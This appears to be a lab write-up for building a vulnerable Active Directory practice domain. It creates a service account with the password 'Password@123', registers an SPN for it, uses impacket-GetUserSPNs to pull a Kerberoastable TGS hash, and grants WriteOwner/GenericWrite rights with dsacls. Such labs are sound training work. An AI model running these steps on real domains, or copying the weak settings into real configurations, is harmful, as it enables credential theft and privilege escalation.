✅ STEP 1 — Create the user sqlsvc
In Active Directory Users and Computers:

Open Server Manager → Tools → Active Directory Users and Computers

Go to Users

Right-click → New → User

Fill details:

First name: SQL

Last name: Service

User logon name: sqlsvc

Password: Password@123

Check:

✔ Password never expires

❌ Do NOT check “User must change password”

Click Finish.

<img width="1053" height="483" alt="image" src="https://github.com/user-attachments/assets/19c5af51-a6fe-40af-995f-cbbf94d7b075" />

<img width="683" height="460" alt="image" src="https://github.com/user-attachments/assets/7835f7a9-4574-49a0-9de4-0f10364d146f" />
<br>

<img width="680" height="454" alt="image" src="https://github.com/user-attachments/assets/f6cd50f9-083f-466a-83ba-64d4b4ff7bf7" />
<br>

<img width="652" height="92" alt="image" src="https://github.com/user-attachments/assets/746788bc-6807-4e6a-bbb2-a064815d74a7" />
<br>


<img width="660" height="91" alt="image" src="https://github.com/user-attachments/assets/78ce35e2-a542-4371-abdf-8ee4a7db0dde" />









✅ STEP 2 — Now assign the SPN

After the user is created, run:

setspn -A MSSQLSvc/Infosec.sandeep.local:1433 sqlsvc


You should see:

Registered ServicePrincipalNames for CN=sqlsvc, CN=Users, DC=sandeep, DC=local

🟢 STEP 3 — Verify SPN
setspn -L sqlsvc


Output will show:

MSSQLSvc/Infosec.sandeep.local:1433


Now the user is kerberoastable.

🟢 STEP 4 — Run Impacket again from Kali
impacket-GetUserSPNs sandeep.local/emma:'Password@123' -dc-ip 192.168.29.193 -request


This time you WILL get a TGS hash:

$krb5tgs$23$*sqlsvc$SANDEEP.LOCAL*...

<img width="1063" height="719" alt="image" src="https://github.com/user-attachments/assets/bf257f8b-a5fd-4e59-98c2-ea6f896412e6" />

<img width="955" height="326" alt="image" src="https://github.com/user-attachments/assets/4ea6e10c-7ed2-4399-8419-7ed22273c63e" />

<img width="1335" height="470" alt="image" src="https://github.com/user-attachments/assets/b92ace06-be0b-4e87-8273-87ceb4ec1a3a" />

Write owner to Management group

    dsacls "CN=Management,CN=Users,DC=sandeep,DC=local" /G "sandeep\sqlsvc:WO"


Generic write on leo

    dsacls "CN=leo,CN=Users,DC=sandeep,DC=local" /G "sandeep\Management:GW"





